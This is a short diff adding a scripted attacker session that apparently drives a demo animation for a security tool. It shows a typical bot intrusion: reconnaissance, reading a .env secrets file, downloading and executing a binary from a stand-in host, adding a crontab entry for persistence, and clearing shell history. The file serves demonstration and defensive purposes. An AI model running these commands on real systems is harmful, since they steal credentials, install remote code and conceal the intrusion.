@@ -1,0 +1,10 @@
+# The attacker session behind docs/demo.gif, typed line by line by tools/demo.
+# A bot's usual arc: look around, grab credentials, drop a payload, persist,
+# cover tracks.
+uname -a
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+cat /srv/bakery/.env
+cd /tmp; wget http://198.51.100.7/x86_64
+chmod +x x86_64; ./x86_64
+echo "*/5 * * * * /tmp/x86_64" | crontab -; crontab -l
+history -c
